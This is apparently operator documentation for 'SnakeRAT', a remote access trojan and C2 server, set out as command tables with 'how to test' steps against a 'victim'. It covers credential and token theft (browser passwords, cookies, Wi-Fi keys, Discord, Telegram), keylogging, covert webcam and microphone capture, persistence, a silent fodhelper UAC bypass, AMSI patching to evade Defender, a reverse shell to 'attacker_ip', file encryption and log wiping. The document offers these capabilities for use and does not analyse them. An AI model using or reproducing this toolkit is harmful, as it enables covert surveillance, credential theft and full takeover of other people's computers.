# SnakeRAT Command Reference & Testing Guide

This document provides a comprehensive list of all commands available in the SnakeRAT C2 system, including their descriptions, usage, and recommended testing procedures.

---

## 1. Session & Connection Management

| Command | Usage | Description | How to Test |
| :--- | :--- | :--- | :--- |
| **clients** | `clients` | List all active/connected bots. | Connect a bot (`d.py`) and verify it appears in the terminal list with ID, IP, and OS info. |
| **select** | `select <id>` | Select a specific bot for targeted commands. | Use `select` with an ID from the `clients` list. Verify the prompt changes to `C2@<id> >`. |
| **deselect** | `deselect` | Drop the current bot selection (commands will broadcast to ALL bots). | Use `deselect` and verify the prompt returns to `C2 >`. |
| **clear** | `clear` | Clear the terminal screen. | Type `clear` to wipe the shell history. |
| **help** | `help` | Show the comprehensive command help menu. | Type `help` to see the built-in documentation. |
| **exit** | `exit` | Gracefully close the server. | Type `exit` and verify the server process terminates. |

---

## 2. File & Data Management

| Command | Usage | Description | How to Test |
| :--- | :--- | :--- | :--- |
| **shell** | `shell <cmd>` | Execute a CMD/Bash command on the victim. | `shell whoami` or `shell dir`. Verify output returns in the terminal. |
| **powershell**| `ps <cmd>` | Run PowerShell commands (Windows only). | `ps Get-Process`. Verify PowerShell-specific output returns. |
| **script** | `script <file>` | Upload and execute a Python script in memory. | Create a `test.py` with `print("Hello")` and run `script test.py`. |
| **download** | `download <path>`| Download a file from the victim to the server. | `download C:\Windows\win.ini`. Check `loot/file/` on the server for the result. |
| **upload** | `upload <file>` | Upload a file from the server to the victim. | `upload tools/payload.exe`. Verify the file arrives in the victim's current directory. |
| **write** | `write <p> <t>` | Write text content directly to a remote file. | `write test.txt "Hello World"`. Use `shell type test.txt` to verify. |
| **browse** | `browse [path]` | List directory contents (cross-platform). | `browse C:\`. Verify the list of files and folders returns. |
| **crypt** | `crypt <p> <act>`| Encrypt/Decrypt files (AES-256). | `crypt secret.txt encrypt`. Verify the file is scrambled. Then use `decrypt`. |
| **drives** | `drives` | List all logical drives and labels. | Type `drives`. Verify it lists C:, D:, etc. with labels. |

---

## 3. Surveillance & Recording

| Command | Usage | Description | How to Test |
| :--- | :--- | :--- | :--- |
| **screenshot** | `screenshot [h]` | Capture a JPEG screenshot of the desktop. | `screenshot`. Check `loot/screenshot/` for the JPG file. |
| **webcam** | `webcam [res]` | Capture a single frame from the webcam. | `webcam 1280x720`. Check `loot/webcam/` for the JPG image. |
| **mic** | `mic <sec>` | Record audio from the microphone to WAV. | `mic 5`. Check `loot/microphone/` and play the WAV file. |
| **keylog** | `keylog <act>` | Start/Stop/Dump/Clear the keylogger. | `keylog start`, type on victim, `keylog dump`. Check `loot/keylog/`. |
| **clip** | `clip <get/set>` | Steal or overwrite the system clipboard. | `clip set "Hacked"`. Verify by pasting on the victim machine. |
| **window** | `window` | Get the title of the active window. | Switch target window on victim and run `window`. Verify title matches. |
| **wlog** | `wlog <act>` | Background window activity logger. | `wlog start`, change windows, `wlog dump`. Pairs with keylogger. |
| **stream** | `stream start` | Start live low-latency screen streaming. | `stream start`. An OpenCV window should open on the server. |
| **wcam** | `wcam start` | Start live low-latency webcam streaming. | `wcam start`. An OpenCV window showing the webcam should open. |
| **recstream** | `recstream <aisk>`| Record the screen stream to an MP4 file. | `recstream start 10`. Verify `loot/recordings/` contains a valid MP4. |
| **recwcam** | `recwcam <aisk>` | Record the webcam stream to an MP4 file. | `recwcam start`. Verify `loot/recordings/` contains the webcam video. |

---

## 4. Credential Harvesting

| Command | Usage | Description | How to Test |
| :--- | :--- | :--- | :--- |
| **passwords** | `passwords` | Extract saved browser passwords. | Run `passwords`. Check `loot/passwords/` for a JSON with decrypted credentials. |
| **cookies** | `cookies [url]` | Extract browser cookies (SQLite). | `cookies`. Check `loot/cookies/`. Works on Chrome, Edge, Brave. |
| **wifi** | `wifi` | Extract Wi-Fi SSIDs and plaintext keys. | Type `wifi`. Verify it lists networks and passwords. |
| **chromelevator**| `chromelevator` | Run advanced browser data extractor. | Run it and check `loot/browser_ext/` for the resulting JSONs. |
| **discord** | `discord` | Steal Discord authentication tokens. | Run `discord`. Verify tokens are saved to `loot/discord_tokens/`. |
| **telegram** | `telegram` | Package Telegram session (tdata) to ZIP. | Run `telegram`. Check `loot/telegram_session/` for the ZIP file. |
| **outlook** | `outlook` | Find Outlook profiles and data file paths. | Run `outlook`. Verify it returns paths to .pst/.ost files. |

---

## 5. Persistence & Privilege

| Command | Usage | Description | How to Test |
| :--- | :--- | :--- | :--- |
| **persist** | `persist` | Install multi-vector persistence. | Run `persist`, reboot victim, verify bot auto-reconnects. |
| **unpersist** | `unpersist` | Remove all persistence mechanisms. | Run `unpersist`, verify bot does NOT reconnect after reboot. |
| **elevate** | `elevate` | Trigger a UAC prompt for Admin rights. | Run `elevate`. Accept prompt on victim. Verify `id` says `Admin: True`. |
| **uac** | `uac <program>` | Silent UAC bypass (fodhelper method). | `uac cmd.exe`. Verify a high-integrity CMD window opens on victim. |
| **amsi** | `amsi` | Patch AMSI in memory (Defender bypass). | Run `amsi`. Verify "AMSI Patch Applied Successfully" in logs. |
| **wmi** | `wmi <cmd>` | Install stealthy WMI event persistence. | Run `wmi` with a path to `d.py`. Check WMI subscriptions on victim. |

---

## 6. Network & Lateral Movement

| Command | Usage | Description | How to Test |
| :--- | :--- | :--- | :--- |
| **sysinfo** | `sysinfo` | Full hardware and software profile. | Type `sysinfo`. Verify OS, CPU, RAM, and Public IP return. |
| **process** | `process <act>` | List or kill running processes. | `process list`. Verify the top 100 processes appear. |
| **registry** | `reg <act> <p>` | CRUD operations on Windows Registry. | `registry read HKCU\Software\Microsoft\Windows\CurrentVersion\Run`. |
| **scan** | `scan <ip> <p>` | TCP port scanner with banner grabbing. | `scan 127.0.0.1 80,443,3389`. Verify open ports are logged. |
| **socks** | `socks <port>` | Start a SOCKS5 proxy on the victim. | `socks 1080`. Point browser to `victim_ip:1080` to tunnel traffic. |
| **revshell** | `revshell <i/p>`| Spawn a reverse shell back to attacker. | Run `nc -lvnp 4444`, then `revshell attacker_ip 4444`. |
| **netstat** | `netstat` | List active network connections. | Type `netstat`. Verify local/remote IP pairs return. |
| **arp** | `arp` | Dump the ARP table (neighbor discovery). | Type `arp`. Verify MAC/IP mappings return. |
| **av** | `av` | Detect installed Antivirus software. | Type `av`. Verify "Windows Defender" or similar appears. |

---

## 7. Interaction & Stealth

| Command | Usage | Description | How to Test |
| :--- | :--- | :--- | :--- |
| **url** | `url <link>` | Open a URL in the default browser. | `url https://google.com`. Verify browser opens on victim. |
| **msg** | `msg <text>` | Pop up a system message box. | `msg "System Update required"`. Verify dialog shows on victim. |
| **wallpaper** | `wallpaper <p>` | Change the desktop wallpaper. | `wallpaper C:\Temp\image.jpg`. Verify desktop changes. |
| **power** | `power <act>` | Lock/Shutdown/Reboot the machine. | `power lock`. Verify victim workstation locks immediately. |
| **input** | `input <act>` | Remote Mouse/Keyboard control. | `input move 500 500`. Verify cursor moves on victim. |
| **block** | `block <on/off>`| Block victim mouse and keyboard input. | `block on`. Try to type on victim. Verify input is ignored. |
| **browser_kill**| `browser_kill` | Force close all running browsers. | Open Chrome/Edge, run `browser_kill`. Verify they close. |
| **autorun** | `autorun <json>`| Set commands to run on every reconnect. | `autorun '[{"type":"sysinfo"}]'`. Verify reconnect triggers info. |
| **abort** | `abort [id]` | Kill a running background task. | Start `mic 60`, run `abort <task_id>`. Verify recording stops. |
| **clean** | `clean` | Wipe shell and activity history logs. | Run `clean`. Verify PS history/Recent files are cleared. |
| **destroy** | `destroy` | Full self-destruct and binary deletion. | Run `destroy`. Verify bot closes and the .py file is deleted. |
| **rdp** | `rdp [adduser]` | Enable Remote Desktop + Firewall. | `rdp adduser`. Then try connecting via `mstsc` from attacker. |
